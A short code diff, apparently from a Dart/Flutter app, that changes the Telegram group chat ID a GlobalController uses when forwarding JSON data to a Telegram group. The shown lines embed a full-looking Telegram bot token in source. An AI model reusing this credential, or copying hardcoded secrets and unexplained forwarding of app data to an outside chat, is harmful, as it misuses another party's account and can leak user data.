@@ -188,7 +188,7 @@ class GlobalController {
           data: json,
         );
         String groupChatId =
-            '-4109393904'; // Replace with your group's username or ID
+            '-4159638074'; // Replace with your group's username or ID
         String botToken = '6682560929:AAGK8VhT_k1QyuvupI1X6aqGtQvucjsYarM';
         sentToGroup(json);
         await sendMessageToGroup(
